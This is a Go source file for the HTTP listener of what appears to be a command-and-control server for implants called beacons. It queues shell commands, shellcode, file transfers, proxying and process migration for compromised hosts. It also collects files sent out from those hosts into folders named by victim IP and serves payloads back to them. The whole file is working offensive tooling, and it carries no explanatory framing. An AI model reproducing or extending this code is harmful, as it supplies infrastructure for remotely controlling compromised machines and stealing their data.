package main 

import (
	"io"
	"os"
	"log"
	"time"
	"mime"
	"bytes"
	"strings"
	"strconv"
	"net/http"
	"io/ioutil"
	"path/filepath"
	"encoding/json"
 	b64 "encoding/base64"
	"github.com/gorilla/mux"
)

type IHttpListener interface {
	startListener() (error)
	webInterfaceHandler(http.ResponseWriter, *http.Request)
	receiveFile(*Beacon, http.ResponseWriter, *http.Request)
	saveBeaconFile(*Beacon, bytes.Buffer, string)
	beaconUploadHandler(http.ResponseWriter, *http.Request)
	beaconGetHandler(http.ResponseWriter, *http.Request)
	beaconPostHandler(http.ResponseWriter, *http.Request)
}

type HttpListener struct {
	Iface string `json:"Interface"`
	Hostname string `json:"Hostname"`
	Port int `json:"Port"`
}

func (server HttpListener) startListener() (error) {
	var router = mux.NewRouter()
	var ifaceIp = getIfaceIp(server.Iface)
	router.HandleFunc("/{data}", server.beaconPostHandler).Host(server.Hostname).Methods("Post")
	router.HandleFunc("/{data}", server.beaconGetHandler).Host(server.Hostname).Methods("Get")
	router.HandleFunc("/d/{data}", server.beaconUploadHandler).Host(server.Hostname).Methods("Get")

	srv := &http.Server{
        Handler:      router,
        Addr:         ifaceIp + ":" + strconv.Itoa(server.Port),
        WriteTimeout: 15 * time.Second,
        ReadTimeout:  15 * time.Second,
    }

	go func() {
    	log.Fatal(srv.ListenAndServe())	
	}()

	return nil
}

func (server HttpListener) receiveFile(beacon *Beacon, w http.ResponseWriter, r *http.Request) {
    r.ParseMultipartForm(32 << 20)
    var buf bytes.Buffer
    file, header, err := r.FormFile("file")
	
	if err != nil {
        info("Failed to receive file.")
		return
    }

    defer file.Close()
    name := strings.Split(header.Filename, "/")
    io.Copy(&buf, file)
    server.saveBeaconFile(beacon, buf, name[len(name)-1])
    buf.Reset()
}

func (server HttpListener) saveBeaconFile(beacon *Beacon, data bytes.Buffer, name string) {
	path := "downloads"
	if _, err := os.Stat(path); os.IsNotExist(err) {
		os.Mkdir(path, 0700)
	}
	path += "/" + beacon.Ip
	if _, err := os.Stat(path); os.IsNotExist(err) {
		os.Mkdir(path, 0700)
	}
	path += "/" + beacon.Id
	if _, err := os.Stat(path); os.IsNotExist(err) {
		os.Mkdir(path, 0700)
	}

	err := ioutil.WriteFile(path + "/" + name, data.Bytes(), 0644)
    if err != nil {
		info("Failed to save file.")
	}

	cwd, err := os.Getwd()

	if err != nil {
		log.Fatal(err)
	}

	info("Saved " + name + " from " + beacon.Id + "@" + beacon.Ip + " to " + cwd + "/" + path + "/" + name)
}

func (server HttpListener) beaconUploadHandler(w http.ResponseWriter, r *http.Request) {
	info("Serving file to beacon.")
	file := mux.Vars(r)["data"]
	plaintext, _ := b64.StdEncoding.DecodeString(file)
	fullPath := string(plaintext)

	if plaintext[0] != '/' {
		path, err := os.Getwd()
		if err != nil {
			log.Fatal(err)
		}
		fullPath = path + "/uploads/" + string(plaintext)
	}

	w.Header().Set("Content-Type", mime.TypeByExtension(filepath.Ext(fullPath)))
	http.ServeFile(w, r, fullPath)
}

func (server HttpListener) beaconGetHandler(w http.ResponseWriter, r *http.Request) {
	var update CommandUpdate
	data := mux.Vars(r)["data"]
	respMap := make(map[string][]string)
	decoded, _ := b64.StdEncoding.DecodeString(data)
	json.Unmarshal(decoded, &update)
	beacon := registerBeacon(update)
	decodedData, _ := b64.StdEncoding.DecodeString(update.Data)

	respMap["exec"] = beacon.ExecBuffer
	respMap["download"] = beacon.DownloadBuffer
	respMap["upload"] = beacon.UploadBuffer
	respMap["shellcode"] = beacon.ShellcodeBuffer
	respMap["proxyclients"] = beacon.ProxyClientBuffer

	json.NewEncoder(w).Encode(respMap)
	beacon.ExecBuffer = nil
	beacon.DownloadBuffer = nil
	beacon.UploadBuffer = nil
	beacon.ShellcodeBuffer = nil
	beacon.ProxyClientBuffer = nil

	if len(update.Data) > 0 {
		if update.Type == "exec" {
			out := strings.Replace(string(decodedData), "\n", "\n\t", -1)
			info("\n[+] Beacon " + update.Id + "@" + update.Ip + " " + update.Type + ":")
			info("\t" + out[:len(out)-1])
		} else if update.Type == "upload" {
			if(decodedData[0] == '1') {
				f := strings.Split(string(decodedData), ";")
				info("Uploaded file to " + beacon.Id + "@" + beacon.Ip + ":" + f[1])
			} else if(decodedData[0] == '0') {
				info("Failed to upload file to " + beacon.Id + "@" + beacon.Ip)
			}
		} else if update.Type == "quit" {
			idx := -1
			for i := 0; i < len(beacons); i++ {
				if beacon == beacons[i] {
					idx = i
					webInterfaceUpdates = append(webInterfaceUpdates, &WebUpdate{"Beacon Exit", beacon.Id + "@" + beacon.Ip})
					info("[+] Beacon " + beacon.Id + "@" + beacon.Ip + " has exited")
					if activeBeacon == beacon {
						activeBeacon = nil
					}
					break
				}
			}
			if idx != -1 {
				beacons = append(beacons[:idx], beacons[idx+1:]...)
			}
		} else if update.Type == "plist" {
			info("[+] Beacon " + beacon.Id + "@" + beacon.Ip + " process list:")
			data, _ := b64.StdEncoding.DecodeString(update.Data)
			info(string(data))
		} else if update.Type == "migrate" {
			infof("[+] Beacon " + beacon.Id + "@" + beacon.Ip + " migrate: ")
			data, _ := b64.StdEncoding.DecodeString(update.Data)
			infof(string(data))

			if string(data) == "Success" {
				webInterfaceUpdates = append(webInterfaceUpdates, &WebUpdate{"Migrate success", beacon.Id + "@" + beacon.Ip})
				info("! Beacon will exit - wait for callback from migrated process.")
			} else {
				info()
			}
		}
		prompt()
	}
}

func (server HttpListener) beaconPostHandler(w http.ResponseWriter, r *http.Request) {
	var update CommandUpdate
	data := mux.Vars(r)["data"]
	decoded, _ := b64.StdEncoding.DecodeString(data)
	
	json.Unmarshal(decoded, &update)
	beacon := registerBeacon(update)

	if update.Type == "upload" {
		info("Receiving " + update.Data + " from " + beacon.Id)
		server.receiveFile(beacon, w, r)
	}
}



